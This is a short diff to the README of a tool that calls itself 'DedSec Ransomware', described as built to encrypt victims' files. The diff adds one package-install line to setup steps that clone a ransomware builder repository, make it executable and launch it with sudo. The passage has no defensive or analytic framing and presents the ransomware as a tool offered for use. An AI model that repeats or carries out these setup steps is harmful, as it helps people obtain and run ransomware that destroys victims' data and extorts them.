@@ -34,6 +34,7 @@ DedSec Ransomware A powerful ransomware tool designed to encrypt victims files w
     * git clone https://github.com/0xbitx/DEDSEC_RANSOMWARE_BUILDER.git
     * cd DEDSEC_RANSOMWARE_BUILDER
     * chmod +x dedsec_ransomware setup
+    * sudo apt-get install imagemagick
     * ./setup
     * sudo ./dedsec_ransomware
 
